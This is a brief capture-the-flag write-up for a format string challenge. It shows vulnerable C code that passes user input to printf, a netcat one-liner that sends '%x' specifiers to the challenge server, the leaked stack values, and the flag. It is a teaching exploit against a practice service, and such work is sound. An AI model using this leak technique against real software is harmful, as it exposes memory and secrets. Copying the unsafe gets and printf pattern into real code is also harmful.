We have this code
```
	char *input;
	char *flag = "REDACTED!";

	gets(input);
	printf(input);

```
printf outputs user input after 1 argument.This is a format string vulnerability.We can get the addresses of the underlying stacks using %x.And read strings at these addresses using %num_string$s
```
slonser@DESKTOP-0USDONC:/mnt/c/Users/Seva/Desktop/HACKERDOM/PWN$ python -c "print('%x.'*20)"| nc cyberyoddha.baycyber.net 10005
200000.ffffffff.8049189.1.ffa8d8b4.ffa8d8bc.804a008.ffa8d820.0.0.f7d07ee5.f7ed0000.f7ed0000.0.f7d07ee5.1.ffa8d8b4.ffa8d8bc.ffa8d844.f7ed0000.0
```
Run FormatS.py and get flag.
`cyctf{3xpl0!t_th3_f0rm@t_str!ng}`